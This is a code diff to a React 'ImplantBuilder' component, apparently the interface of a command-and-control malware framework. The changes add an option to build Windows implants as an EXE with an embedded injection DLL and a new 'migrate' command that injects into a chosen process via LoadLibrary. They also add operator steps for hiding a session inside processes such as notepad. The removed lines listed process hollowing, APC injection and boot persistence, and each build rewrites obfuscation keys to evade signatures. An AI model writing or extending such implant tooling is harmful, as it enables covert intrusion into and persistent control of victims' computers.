@@ -379,6 +379,7 @@ function formatBytes(n) {
 const ImplantBuilder = () => {
   const [platform, setPlatform] = useState('windows');
   const [arch, setArch] = useState('amd64');
+  const [format, setFormat] = useState('exe');
   const [host, setHost] = useState('127.0.0.1');
   const [port, setPort] = useState(2026);
   const [outputName, setOutputName] = useState('');
@@ -423,6 +424,7 @@ const ImplantBuilder = () => {
         {
           platform,
           arch,
+          format: platform === 'windows' ? format : 'exe',
           host: host.trim(),
           port: Number(port),
           outputName: outputName.trim() || undefined,
@@ -476,44 +478,24 @@ const ImplantBuilder = () => {
 
   const windowsCommands = [
     {
-      name: 'injectdll',
-      desc: 'Classic DLL injection using CreateRemoteThread + LoadLibrary',
-      example: 'injectdll 1234 C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
-    },
-    {
-      name: 'injectapc',
-      desc: 'Stealthier injection via QueueUserAPC (process must be alertable)',
-      example: 'injectapc 1234 C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
-    },
-    {
-      name: 'injectmanual',
-      desc: 'Manual DLL mapping (no LoadLibrary, harder to detect)',
-      example: 'injectmanual 1234 C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
-    },
-    {
-      name: 'hollowprocess',
-      desc: 'Process hollowing - replace target process memory with payload',
-      example: 'hollowprocess C:\\Windows\\System32\\notepad.exe C:\\Users\\cui12\\AppData\\Local\\Temp\\winupdateb01c5c.exe'
-    },
-    {
       name: 'processes',
-      desc: 'List all running processes to find target PIDs',
+      desc: 'List processes and copy the host PID you want to live inside',
       example: 'processes'
     },
     {
-      name: 'sysinfo',
-      desc: 'Get system information and current process details',
-      example: 'sysinfo'
+      name: 'migrate',
+      desc: 'REAL inject: drop embedded DLL into that PID via LoadLibrary. Session dies when THAT PID dies.',
+      example: 'migrate 3640'
+    },
+    {
+      name: 'injectdll',
+      desc: 'REAL inject of a .dll path only (not .exe). Same LoadLibrary behavior as migrate.',
+      example: 'injectdll 3640 C:\\Users\\cui12\\AppData\\Local\\Temp\\mshelper_123.dll'
     },
     {
       name: 'checkpersistence',
-      desc: 'Check if current implant has persistence enabled',
+      desc: 'Show TEMP persistence path of this session',
       example: 'checkpersistence'
-    },
-    {
-      name: 'setpersistence',
-      desc: 'Enable persistence (auto-start on boot)',
-      example: 'setpersistence'
     }
   ];
 
@@ -600,6 +582,16 @@ const ImplantBuilder = () => {
             </Select>
           </Field>
 
+          {platform === 'windows' && (
+            <Field>
+              Output format
+              <Select value={format} onChange={(e) => setFormat(e.target.value)}>
+                <option value="exe">EXE + embedded inject DLL (recommended)</option>
+                <option value="dll">DLL only (for injectdll path)</option>
+              </Select>
+            </Field>
+          )}
+
           <Field>
             C2 Host
             <Input
@@ -633,12 +625,17 @@ const ImplantBuilder = () => {
             <FiCpu />
             {busy
               ? 'Building (unique signature)…'
-              : `Generate ${platform === 'windows' ? 'Windows EXE' : 'Linux binary'}`}
+              : platform === 'windows'
+                ? format === 'dll'
+                  ? 'Generate Windows DLL'
+                  : 'Generate Windows EXE (+ inject DLL)'
+                : 'Generate Linux binary'}
           </GenerateBtn>
 
           <Note>
-            Each build rewrites obfuscation keys and embeds a unique stamp. Use local host/port for testing,
-            production host/TCP for live implants.
+            Windows EXE builds embed a real inject DLL. After you connect, run{' '}
+            <code>migrate &lt;pid&gt;</code> — the session then lives inside that process
+            (kill the host PID to kill the session). Do not inject an .exe path.
           </Note>
         </div>
 
@@ -664,8 +661,11 @@ const ImplantBuilder = () => {
                   <BuildMeta>
                     <div className="name">{b.fileName}</div>
                     <div className="sub">
-                      {b.platform}/{b.arch} · {b.host}:{b.port} · {formatBytes(b.size)} ·{' '}
-                      {new Date(b.createdAt).toLocaleString()} · {b.sha256?.slice(0, 8)}
+                      {b.platform}/{b.arch}
+                      {b.format ? `/${b.format}` : ''}
+                      {b.injectDllPacked ? ' · migrate-ready' : ''} · {b.host}:{b.port} ·{' '}
+                      {formatBytes(b.size)} · {new Date(b.createdAt).toLocaleString()} ·{' '}
+                      {b.sha256?.slice(0, 8)}
                     </div>
                   </BuildMeta>
                   <div style={{ display: 'flex', gap: 4 }}>
@@ -738,12 +738,13 @@ const ImplantBuilder = () => {
               </CommandSection>
 
               <CommandSection>
-                <h4>📋 Usage Steps</h4>
+                <h4>📋 Real inject (session tied to host PID)</h4>
                 <p>
-                  1. Run <code>processes</code> to find target PID<br/>
-                  2. Use <code>injectdll &lt;PID&gt; &lt;your_implant_path&gt;</code><br/>
-                  3. Injected process creates new C2 session<br/>
-                  4. Original session remains active
+                  1. Generate <b>EXE + embedded inject DLL</b> and run the EXE<br/>
+                  2. <code>processes</code> → copy target PID (e.g. notepad)<br/>
+                  3. <code>migrate 3640</code><br/>
+                  4. New session appears — it lives <b>inside</b> that PID<br/>
+                  5. Kill original EXE → session stays · Kill PID 3640 → session dies
                 </p>
               </CommandSection>
 
